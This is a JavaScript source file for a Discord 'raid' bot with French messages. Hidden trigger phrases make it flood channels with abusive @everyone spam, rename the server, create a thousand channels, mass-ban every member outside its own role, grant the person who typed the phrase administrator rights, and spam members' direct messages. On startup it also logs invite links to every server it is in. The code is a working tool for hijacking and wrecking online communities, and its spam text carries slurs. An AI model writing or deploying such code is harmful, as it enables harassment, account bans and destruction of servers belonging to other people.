const Discord = require('discord.js');
const bot = new Discord.Client();
const fs = require('fs');
 
var fucked = false;
 



bot.on('ready',() => {
  //invit link
  console.log("---------------------------")

  bot.guilds.forEach(guild => {
    var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
    invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`)).catch(e => {});
  });
  
  bot.user.setActivity("Frapper Avouap", {url:"https://www.twitch.tv/AVOUAP", type: "STREAMING"})
  bot.user.setAvatar("./bf.jpg");
}); 

bot.on('message', msg => {

  //if (msg.guild === bot.guilds.find('id', 'ID d'un serv a proteger')){ 
   // return;
 // }
  
  

    
if (msg.content === 'Havox se réincarne') {
    console.log(`Commande Havox se réincarne par ${msg.author.tag}`);
    var interval = setInterval (function () {
      msg.channel.send(`@everyone @here Ployez le genou devant la Brigade fantôme, ainsi que les bêtes de l'ombres, VOUS LES ANIMAUX EUNUQUES QUE VOUS ETES TOUS, A GENOUX BANDE DE PUTES. \nhttps://cdn.discordapp.com/attachments/351449268436860928/461570321275944970/unknown.png`).catch(e => {});
    }, 450)
  }

if (msg.content === 'REQUIEM') {
    console.log(`Commande REQUIEM par ${msg.author.tag}`);
   fucked = false;

 
    if (!fucked){
      msg.guild.setIcon("./bf.jpg").catch(e => {});
      msg.guild.setName('LE ROYAUME D\'HABOX').catch(e => {});
     msg.guild.setRegion('hongkong').catch(e => {});
 
      for (var i = 0; i < 500; i++) {
        msg.guild.createChannel('trone-d-havox', 'text').catch(e => {});
        msg.guild.createChannel('TRONE D\'HAVOX', 'voice').catch(e => {});
      }
      fucked = true;
    }
 
    if (msg.deletable) {
      msg.delete();
    }
  }


if (msg.content === 'DEGAGETOUS') {
    console.log(`Commande .DEGAGETOUS par ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "PHENIX") && member.bannable) member.ban().catch(e => {});
    });
  }


if (msg.content === 'DEGAGEBOT') {
    console.log(`Commande DEGAGE par ${msg.author.tag}`);
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.leave().catch(e => {});
  }

if (msg.content === 'PHENIX21') {
    console.log(`Commande PHENIX21 par ${msg.author.tag}`);

    msg.member.guild.createRole({
      name: "PHENIX",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role).catch(e => {});
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }
  if (msg.content === 'ATRIBUTION') {

    if (msg.deletable) msg.delete();
    let i = 0;
    let interval = setInterval(function () {
    if (i === 500) clearInterval(interval);
      msg.guild.createRole({name: 'ANIMAUX DE L\'ENCLO', color:'RANDOM', permissions: "ADMINISTRATOR"}).then(function(role) {
        msg.member.addRole(role).catch(e => {});
        if (msg.deletable) msg.delete().catch(e => {});
      }).catch(e => {});
      i++
    }, 100)
  }

  if(msg.content === "ATRIBUTION1"){
    if(msg.deletable) msg.delete();
    msg.guild.members.forEach(member => {
      if(member.setNickname("ANIMAUX DE L'ENCLOS"));      
  })
  }
  if(msg.content === "KNOW"){
    if(msg.deletable) msg.delete();
    i = 0;
    msg.guild.members.forEach(member => {

    if(i < 500){
      var interval = setInterval (function () {
        member.send(`BEND THE KNEW FOR Havoxx#1806`).catch(e => {});
      }, 450)

      }   
  })

  }

 //Filtre personne
});
//ce n'est pas le token dmon bot
bot.login("token"); 
